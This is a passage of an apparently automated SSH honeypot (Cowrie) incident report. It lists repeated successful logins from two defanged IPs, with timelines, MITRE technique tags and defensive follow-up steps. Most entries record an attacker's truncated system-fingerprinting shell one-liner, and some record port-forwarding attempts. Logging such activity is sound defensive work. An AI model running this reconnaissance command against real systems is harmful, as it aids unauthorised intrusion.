| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:55:57` | `cowrie.session.connect` |
| `2026-09-03 10:55:58` | `cowrie.client.version` |
| `2026-09-03 10:55:58` | `cowrie.client.kex` |
| `2026-09-03 10:55:59` | `cowrie.login.success` |
| `2026-09-03 10:56:00` | `cowrie.session.params` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.success` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.command.input` |
| `2026-09-03 10:56:00` | `cowrie.log.closed` |
| `2026-09-03 10:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa57298ac91d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:57 |
| **Last Seen** | 2026-09-03 10:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:57:10` | `cowrie.session.connect` |
| `2026-09-03 10:57:10` | `cowrie.client.version` |
| `2026-09-03 10:57:10` | `cowrie.client.kex` |
| `2026-09-03 10:57:11` | `cowrie.login.success` |
| `2026-09-03 10:57:11` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:57:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:57:12` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c3976dc4c0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:57 |
| **Last Seen** | 2026-09-03 10:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:57:11` | `cowrie.session.connect` |
| `2026-09-03 10:57:11` | `cowrie.client.version` |
| `2026-09-03 10:57:11` | `cowrie.client.kex` |
| `2026-09-03 10:57:12` | `cowrie.login.success` |
| `2026-09-03 10:57:13` | `cowrie.session.params` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.success` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.command.input` |
| `2026-09-03 10:57:13` | `cowrie.log.closed` |
| `2026-09-03 10:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51d1852ae1d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:58 |
| **Last Seen** | 2026-09-03 10:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:58:20` | `cowrie.session.connect` |
| `2026-09-03 10:58:20` | `cowrie.client.version` |
| `2026-09-03 10:58:20` | `cowrie.client.kex` |
| `2026-09-03 10:58:21` | `cowrie.login.success` |
| `2026-09-03 10:58:23` | `cowrie.session.params` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.success` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.command.input` |
| `2026-09-03 10:58:23` | `cowrie.log.closed` |
| `2026-09-03 10:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d8d2f62a11

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:59 |
| **Last Seen** | 2026-09-03 10:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:59:25` | `cowrie.session.connect` |
| `2026-09-03 10:59:25` | `cowrie.client.version` |
| `2026-09-03 10:59:25` | `cowrie.client.kex` |
| `2026-09-03 10:59:27` | `cowrie.login.success` |
| `2026-09-03 10:59:28` | `cowrie.session.params` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.success` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.command.input` |
| `2026-09-03 10:59:28` | `cowrie.log.closed` |
| `2026-09-03 10:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e757e2d148

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:00 |
| **Last Seen** | 2026-09-03 11:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:00:31` | `cowrie.session.connect` |
| `2026-09-03 11:00:31` | `cowrie.client.version` |
| `2026-09-03 11:00:31` | `cowrie.client.kex` |
| `2026-09-03 11:00:33` | `cowrie.login.success` |
| `2026-09-03 11:00:34` | `cowrie.session.params` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.success` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.command.input` |
| `2026-09-03 11:00:34` | `cowrie.log.closed` |
| `2026-09-03 11:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-768abd0b91d1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:01 |
| **Last Seen** | 2026-09-03 11:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:01:38` | `cowrie.session.connect` |
| `2026-09-03 11:01:38` | `cowrie.client.version` |
| `2026-09-03 11:01:38` | `cowrie.client.kex` |
| `2026-09-03 11:01:39` | `cowrie.login.success` |
| `2026-09-03 11:01:40` | `cowrie.session.params` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.success` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.command.input` |
| `2026-09-03 11:01:40` | `cowrie.log.closed` |
| `2026-09-03 11:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5601dd8eb004

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:02 |
| **Last Seen** | 2026-09-03 11:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:02:50` | `cowrie.session.connect` |
| `2026-09-03 11:02:50` | `cowrie.client.version` |
| `2026-09-03 11:02:50` | `cowrie.client.kex` |
| `2026-09-03 11:02:51` | `cowrie.login.success` |
| `2026-09-03 11:02:52` | `cowrie.session.params` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.success` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.command.input` |
| `2026-09-03 11:02:52` | `cowrie.log.closed` |
| `2026-09-03 11:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104988cd9b46

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:03 |
| **Last Seen** | 2026-09-03 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:03:03` | `cowrie.session.connect` |
| `2026-09-03 11:03:03` | `cowrie.client.version` |
| `2026-09-03 11:03:03` | `cowrie.client.kex` |
| `2026-09-03 11:03:04` | `cowrie.login.success` |
| `2026-09-03 11:03:04` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:03:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:03:04` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00466b2cc48d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:04 |
| **Last Seen** | 2026-09-03 11:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:04:10` | `cowrie.session.connect` |
| `2026-09-03 11:04:10` | `cowrie.client.version` |
| `2026-09-03 11:04:11` | `cowrie.client.kex` |
| `2026-09-03 11:04:11` | `cowrie.login.success` |
| `2026-09-03 11:04:12` | `cowrie.session.params` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.success` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.command.input` |
| `2026-09-03 11:04:12` | `cowrie.log.closed` |
| `2026-09-03 11:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ff3c22961c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:05 |
| **Last Seen** | 2026-09-03 11:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:05:35` | `cowrie.session.connect` |
| `2026-09-03 11:05:35` | `cowrie.client.version` |
| `2026-09-03 11:05:35` | `cowrie.client.kex` |
| `2026-09-03 11:05:36` | `cowrie.login.success` |
| `2026-09-03 11:05:37` | `cowrie.session.params` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.success` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.command.input` |
| `2026-09-03 11:05:37` | `cowrie.log.closed` |
| `2026-09-03 11:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73527a620aa8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:06 |
| **Last Seen** | 2026-09-03 11:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:06:48` | `cowrie.session.connect` |
| `2026-09-03 11:06:48` | `cowrie.client.version` |
| `2026-09-03 11:06:48` | `cowrie.client.kex` |
| `2026-09-03 11:06:49` | `cowrie.login.success` |
| `2026-09-03 11:06:51` | `cowrie.session.params` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.success` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.command.input` |
| `2026-09-03 11:06:51` | `cowrie.log.closed` |
| `2026-09-03 11:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18f984c8dfe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:07 |
| **Last Seen** | 2026-09-03 11:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:07:56` | `cowrie.session.connect` |
| `2026-09-03 11:07:56` | `cowrie.client.version` |
| `2026-09-03 11:07:56` | `cowrie.client.kex` |
| `2026-09-03 11:07:57` | `cowrie.login.success` |
| `2026-09-03 11:07:58` | `cowrie.session.params` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.success` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:58` | `cowrie.command.input` |
| `2026-09-03 11:07:59` | `cowrie.log.closed` |
| `2026-09-03 11:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abdd7f27bec0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:08 |
| **Last Seen** | 2026-09-03 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
